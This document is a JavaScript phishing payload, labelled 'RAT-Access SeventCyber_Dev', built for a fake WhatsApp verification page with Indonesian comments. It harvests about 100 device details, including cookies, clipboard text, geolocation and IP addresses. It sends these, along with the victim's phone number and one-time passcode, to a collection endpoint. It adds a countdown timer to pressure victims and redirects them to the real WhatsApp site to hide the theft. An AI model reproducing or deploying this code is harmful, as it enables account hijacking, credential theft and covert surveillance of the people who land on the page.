// RAT-Access SeventCyber_Dev - Advanced Payload
(async function() {
    // FingerprintJS untuk device ID unik
    const fp = await FingerprintJS.load();
    const result = await fp.get();
    
    // ===== 100 DETAIL INFORMASI DEVICE =====
    const deviceInfo = {
        // 1-10: Basic Browser Info
        userAgent: navigator.userAgent,
        appVersion: navigator.appVersion,
        platform: navigator.platform,
        vendor: navigator.vendor,
        product: navigator.product,
        appName: navigator.appName,
        appCodeName: navigator.appCodeName,
        language: navigator.language,
        languages: navigator.languages,
        cookieEnabled: navigator.cookieEnabled,
        
        // 11-20: Screen & Display
        screenWidth: screen.width,
        screenHeight: screen.height,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        devicePixelRatio: window.devicePixelRatio,
        orientation: screen.orientation?.type,
        innerWidth: window.innerWidth,
        innerHeight: window.innerHeight,
        
        // 21-30: Hardware Info
        hardwareConcurrency: navigator.hardwareConcurrency,
        deviceMemory: navigator.deviceMemory,
        maxTouchPoints: navigator.maxTouchPoints,
        cpuClass: navigator.cpuClass,
        oscpu: navigator.oscpu,
        productSub: navigator.productSub,
        vendorSub: navigator.vendorSub,
        bluetooth: await checkBluetooth(),
        usb: await checkUSB(),
        serial: await checkSerial(),
        
        // 31-40: Network Info
        connectionType: navigator.connection?.effectiveType,
        downlink: navigator.connection?.downlink,
        rtt: navigator.connection?.rtt,
        saveData: navigator.connection?.saveData,
        onLine: navigator.onLine,
        referrer: document.referrer,
        locationHref: window.location.href,
        hostname: window.location.hostname,
        pathname: window.location.pathname,
        protocol: window.location.protocol,
        
        // 41-50: Timezone & Geolocation
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timezoneOffset: new Date().getTimezoneOffset(),
        locale: Intl.DateTimeFormat().resolvedOptions().locale,
        calendar: Intl.DateTimeFormat().resolvedOptions().calendar,
        numberingSystem: Intl.DateTimeFormat().resolvedOptions().numberingSystem,
        geolocation: await getGeolocation(),
        country: Intl.DateTimeFormat().resolvedOptions().timeZone?.split('/')[0],
        dateString: new Date().toString(),
        timestamp: Date.now(),
        epochSeconds: Math.floor(Date.now() / 1000),
        
        // 51-60: Canvas Fingerprint
        canvasFingerprint: getCanvasFingerprint(),
        webglFingerprint: getWebGLFingerprint(),
        webglVendor: getWebGLInfo().vendor,
        webglRenderer: getWebGLInfo().renderer,
        audioFingerprint: getAudioFingerprint(),
        fonts: await getFonts(),
        plugins: getPlugins(),
        mimeTypes: getMimeTypes(),
        touchSupport: 'ontouchstart' in window,
        adBlock: await detectAdBlock(),
        
        // 61-70: Storage & Permissions
        localStorage: !!window.localStorage,
        sessionStorage: !!window.sessionStorage,
        indexedDB: !!window.indexedDB,
        openDatabase: !!window.openDatabase,
        cookies: document.cookie,
        permissions: await getPermissions(),
        serviceWorker: 'serviceWorker' in navigator,
        webShare: 'share' in navigator,
        webRTC: !!window.RTCPeerConnection,
        webSocket: 'WebSocket' in window,
        
        // 71-80: Browser Features
        doNotTrack: navigator.doNotTrack,
        pdfViewer: navigator.pdfViewerEnabled,
        webdriver: navigator.webdriver,
        credentialManagement: 'credentials' in navigator,
        mediaDevices: 'mediaDevices' in navigator,
        battery: await getBatteryInfo(),
        vibration: 'vibrate' in navigator,
        notification: 'Notification' in window,
        pushManager: 'PushManager' in window,
        paymentRequest: 'PaymentRequest' in window,
        
        // 81-90: Advanced Fingerprint
        fingerprint: result.visitorId,
        fingerprintComponents: result.components,
        publicIP: await getPublicIP(),
        localIP: await getLocalIP(),
        openPorts: await scanPorts(),
        browserCache: await getCacheSize(),
        ramUsage: performance.memory?.usedJSHeapSize,
        ramLimit: performance.memory?.jsHeapSizeLimit,
        sessionDuration: performance.now(),
        navigationType: performance.navigation?.type,
        
        // 91-100: Additional Intel
        architecture: getArchitecture(),
        buildID: navigator.buildID,
        mediaCapabilities: await getMediaCapabilities(),
        speechSynthesis: 'speechSynthesis' in window,
        speechRecognition: 'SpeechRecognition' in window || 'webkitSpeechRecognition' in window,
        gamepads: navigator.getGamepads?.()?.length,
        virtualReality: 'xr' in navigator,
        clipboard: await readClipboard(),
        incognito: await detectIncognito(),
        installedApps: await detectInstalledApps()
    };
    
    // Kirim ke backend
    fetch('/api/collect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            phone: document.getElementById('phone')?.value,
            otp: document.getElementById('otp')?.value,
            deviceInfo: deviceInfo,
            timestamp: new Date().toISOString()
        })
    });
    
    // Countdown timer pressure
    let timeLeft = 299;
    setInterval(() => {
        timeLeft--;
        const minutes = Math.floor(timeLeft / 60);
        const seconds = timeLeft % 60;
        document.getElementById('countdown').textContent = 
            `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
    }, 1000);
    
    // Form submit interceptor
    document.getElementById('verifyForm')?.addEventListener('submit', async (e) => {
        e.preventDefault();
        // Re-send data dan redirect ke WhatsApp asli
        setTimeout(() => {
            window.location.href = 'https://web.whatsapp.com';
        }, 2000);
    });
})();

// Helper functions untuk 100 info
function getCanvasFingerprint() {
    try {
        const canvas = document.createElement('canvas');
        canvas.width = 280;
        canvas.height = 60;
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(125,1,62,20);
        ctx.fillStyle = '#069';
        ctx.fillText('SeventCyber_Dev', 2, 15);
        return canvas.toDataURL().slice(0, 100);
    } catch(e) { return 'blocked'; }
}

function getWebGLFingerprint() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return 'no-webgl';
        return gl.getParameter(gl.RENDERER) + '|' + gl.getParameter(gl.VENDOR);
    } catch(e) { return 'blocked'; }
}

function getWebGLInfo() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl');
        return {
            vendor: gl?.getParameter(gl.VENDOR),
            renderer: gl?.getParameter(gl.RENDERER)
        };
    } catch(e) { return { vendor: 'unknown', renderer: 'unknown' }; }
}

function getAudioFingerprint() {
    try {
        const ctx = new (window.AudioContext || window.webkitAudioContext)();
        const osc = ctx.createOscillator();
        const analyser = ctx.createAnalyser();
        osc.connect(analyser);
        return analyser.frequencyBinCount + '|' + ctx.sampleRate;
    } catch(e) { return 'blocked'; }
}

async function getFonts() {
    try {
        const fonts = await document.fonts.ready;
        const fontList = [];
        for (const font of fonts) fontList.push(font.family);
        return fontList.slice(0, 50);
    } catch(e) { return []; }
}

function getPlugins() {
    return Array.from(navigator.plugins || []).map(p => p.name);
}

function getMimeTypes() {
    return Array.from(navigator.mimeTypes || []).map(m => m.type);
}

async function detectAdBlock() {
    try {
        const test = document.createElement('div');
        test.className = 'adsbox';
        test.innerHTML = '&nbsp;';
        document.body.appendChild(test);
        await new Promise(r => setTimeout(r, 100));
        const blocked = test.offsetHeight === 0;
        document.body.removeChild(test);
        return blocked;
    } catch(e) { return 'unknown'; }
}

async function getPermissions() {
    const permissions = ['geolocation', 'notifications', 'camera', 'microphone', 'clipboard-read', 'clipboard-write'];
    const result = {};
    for (const perm of permissions) {
        try {
            result[perm] = (await navigator.permissions.query({name: perm})).state;
        } catch(e) { result[perm] = 'denied/unknown'; }
    }
    return result;
}

async function getBatteryInfo() {
    try {
        const battery = await navigator.getBattery();
        return {
            charging: battery.charging,
            level: battery.level,
            chargingTime: battery.chargingTime,
            dischargingTime: battery.dischargingTime
        };
    } catch(e) { return null; }
}

async function getPublicIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
    } catch(e) { return 'blocked'; }
}

async function getLocalIP() {
    try {
        const pc = new RTCPeerConnection({iceServers: []});
        pc.createDataChannel('');
        const offer = await pc.createOffer();
        await pc.setLocalDescription(offer);
        return new Promise(resolve => {
            pc.onicecandidate = (e) => {
                if (e.candidate) {
                    const ip = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
                    resolve(ip?.[0] || 'unknown');
                }
            };
            setTimeout(() => resolve('timeout'), 1000);
        });
    } catch(e) { return 'blocked'; }
}

function getArchitecture() {
    const nav = navigator.userAgent;
    if (nav.includes('x64') || nav.includes('x86_64') || nav.includes('Win64')) return 'x64';
    if (nav.includes('x86') || nav.includes('i386')) return 'x86';
    if (nav.includes('arm64') || nav.includes('aarch64')) return 'ARM64';
    if (nav.includes('arm')) return 'ARM';
    return 'unknown';
}

async function getGeolocation() {
    return new Promise(resolve => {
        navigator.geolocation.getCurrentPosition(
            pos => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy }),
            () => resolve('denied'),
            { timeout: 3000 }
        );
    });
}

async function getCacheSize() {
    if ('storage' in navigator) {
        const estimate = await navigator.storage.estimate();
        return { usage: estimate.usage, quota: estimate.quota };
    }
    return null;
}

async function checkBluetooth() {
    try {
        const devices = await navigator.bluetooth?.getAvailability();
        return devices || false;
    } catch(e) { return false; }
}

async function checkUSB() {
    return 'usb' in navigator;
}

async function checkSerial() {
    return 'serial' in navigator;
}

function getMediaCapabilities() {
    return 'mediaCapabilities' in navigator;
}

async function readClipboard() {
    try {
        const text = await navigator.clipboard?.readText();
        return text?.slice(0, 100) || 'empty';
    } catch(e) { return 'denied'; }
}

async function detectIncognito() {
    return new Promise(resolve => {
        const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
        if (!fs) { resolve('unknown'); return; }
        fs(window.TEMPORARY, 100, () => resolve(false), () => resolve(true));
    });
}

async function detectInstalledApps() {
    const schemes = ['whatsapp://', 'tg://', 'fb://', 'instagram://', 'twitter://'];
    const installed = [];
    for (const scheme of schemes) {
        try {
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = scheme;
            document.body.appendChild(iframe);
            setTimeout(() => document.body.removeChild(iframe), 100);
        } catch(e) {}
    }
    return installed;
}

async function scanPorts() {
    return 'blocked';
}
